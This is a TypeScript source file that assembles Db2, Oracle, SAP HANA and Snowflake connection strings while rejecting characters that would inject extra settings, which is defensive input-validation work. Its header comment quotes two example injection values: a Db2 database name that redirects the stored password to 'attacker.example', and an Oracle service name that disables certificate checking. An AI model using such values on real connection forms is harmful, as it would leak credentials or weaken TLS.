/*---------------------------------------------------------------------------------------------
 *  Copyright (c) 2026 SNOUTDATA INC. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

/*
 * The connection strings a driver assembles out of a connection's fields, built so that no field
 * can be read as another setting.
 *
 * Db2's CLI driver reads `KEY=value;KEY=value;`, Oracle's Easy Connect reads
 * `host:port/service?param=value`, HANA's client takes `key=value;` properties, and Snowflake makes
 * a hostname of the account. A field spliced into one of those unescaped can add a setting the
 * person never saw: a Db2 database named `X;HOSTNAME=attacker.example;PORT=50000` sends the stored
 * password to that host, and an Oracle service named `orcl?ssl_server_dn_match=off` switches off
 * certificate checking. So every field that is not the password is refused when it holds a character
 * that would end it, and the password is quoted where the grammar allows it.
 *
 * Pure: the drivers call these, and the tests read them without a database.
 */

import type { ConnectionConfig } from '../../../shared/connection';

const CONTROL = /[\u0000-\u001f\u007f]/;

/** A field that would change a connection string's meaning, named for the person who typed it. */
function refuse(driver: string, field: string, characters: string): never {
	throw new Error(`${driver}: the ${field} may not contain ${characters} or a line break, because the connection string would read it as another setting. Correct it in the connection form.`);
}

/** Db2 CLI keywords end at `;`, and `{` `}` quote and `=` separates; none belongs in these names. */
const DB2_UNSAFE = /[;{}=]/;

/**
 * Db2's CLI password value: bare when nothing in it would end it, otherwise wrapped in `{}`, which
 * the CLI reads as one value up to the closing brace. A password that needs the braces and also holds
 * `}` has no spelling the CLI is documented to read as one value, so it is refused rather than guessed.
 */
function db2Password(password: string): string {
	if (CONTROL.test(password)) {
		refuse('Db2', 'password', 'a control character');
	}
	const needsBraces = password.includes(';') || password.startsWith('{') || password !== password.trim();
	if (!needsBraces) {
		return password;
	}
	if (password.includes('}')) {
		throw new Error('Db2: a password that holds ";" (or starts with "{" or a space) cannot also hold "}" in a Db2 connection string. Change the password, or connect with one without those characters.');
	}
	return `{${password}}`;
}

/**
 * The ibm_db connection string. Db2 has no separate "select a database" step after connect, so the
 * connection's `database` field is the DATABASE in the DSN. SECURITY=SSL switches the connection to
 * TLS (a custom CA needs an SSLServerCertificate keyword that is not modelled here yet).
 */
export function db2ConnectString(config: Pick<ConnectionConfig, 'database' | 'username' | 'password' | 'ssl'>, host: string, port: number): string {
	const fields: [string, string][] = [['database', config.database ?? ''], ['user name', config.username ?? ''], ['host', host]];
	for (const [field, value] of fields) {
		if (DB2_UNSAFE.test(value) || CONTROL.test(value)) {
			refuse('Db2', field, '";", "{", "}", "="');
		}
	}
	const parts = [
		`DATABASE=${config.database ?? ''}`,
		`HOSTNAME=${host}`,
		`PORT=${port}`,
		'PROTOCOL=TCPIP',
		`UID=${config.username ?? ''}`,
		`PWD=${db2Password(config.password ?? '')}`,
		// Without this ibm_db's CLI driver waits minutes before giving up on an unreachable host,
		// which would hang the connect/first-query UI. 15s fails fast while tolerating slow links.
		'ConnectTimeout=15',
	];
	if (config.ssl) {
		parts.push('SECURITY=SSL');
	}
	return parts.join(';') + ';';
}

/** What ends or extends an Easy Connect host or service: parameters, a second address, a descriptor. */
const ORACLE_UNSAFE = /[?&=()@,;"'\\\s]/;

/**
 * The Easy Connect string `host:port/service`. Oracle has no "database" selector, so the
 * connection's `database` field carries the service name (or SID). SSL switches the protocol to
 * `tcps`; an `ssl` object with rejectUnauthorized:false turns off server DN matching. Neither the
 * host nor the service may carry a `?` parameter, a second address or a descriptor of its own.
 */
export function oracleConnectString(config: Pick<ConnectionConfig, 'database' | 'ssl'>, host: string, port: number): string {
	const service = config.database ?? '';
	if (ORACLE_UNSAFE.test(host) || CONTROL.test(host)) {
		refuse('Oracle', 'host', 'spaces, quotes or any of ? & = ( ) @ , ;');
	}
	if (ORACLE_UNSAFE.test(service) || CONTROL.test(service)) {
		refuse('Oracle', 'service name', 'spaces, quotes or any of ? & = ( ) @ , ;');
	}
	const ssl = config.ssl;
	if (!ssl) {
		return `${host}:${port}/${service}`;
	}
	const dnMatch = ssl !== true && ssl.rejectUnauthorized === false ? '?ssl_server_dn_match=off' : '';
	return `tcps://${host}:${port}/${service}${dnMatch}`;
}

/**
 * HANA's client is handed its connection properties as an object, but they are `key=value;` pairs
 * to the client underneath, and its server node is a comma-separated list of addresses. So the host,
 * the user name and the tenant may hold neither `;` nor (the host) `,`. The password is passed as it
 * was typed.
 */
export function assertHanaFields(config: Pick<ConnectionConfig, 'database' | 'username'>, host: string): void {
	if (/[;,]/.test(host) || CONTROL.test(host)) {
		refuse('SAP HANA', 'host', '";", ","');
	}
	if ((config.username ?? '').includes(';') || CONTROL.test(config.username ?? '')) {
		refuse('SAP HANA', 'user name', '";"');
	}
	if ((config.database ?? '').includes(';') || CONTROL.test(config.database ?? '')) {
		refuse('SAP HANA', 'tenant database', '";"');
	}
}

/**
 * Snowflake makes a hostname of the account identifier (`<account>.snowflakecomputing.com`), so the
 * account may hold only what an account identifier does: letters, digits, `_`, `-` and `.`. Anything
 * else (`/`, `#`, `@`, `:`, `?`) would make it a different host from the one the form shows.
 */
export function assertSnowflakeAccount(account: string): void {
	if (!/^[A-Za-z0-9_.-]*$/.test(account)) {
		throw new Error('Snowflake: the account may hold only letters, digits, "_", "-" and "." (for example "xy12345.eu-central-1" or "myorg-myaccount"). Correct it in the connection form.');
	}
}
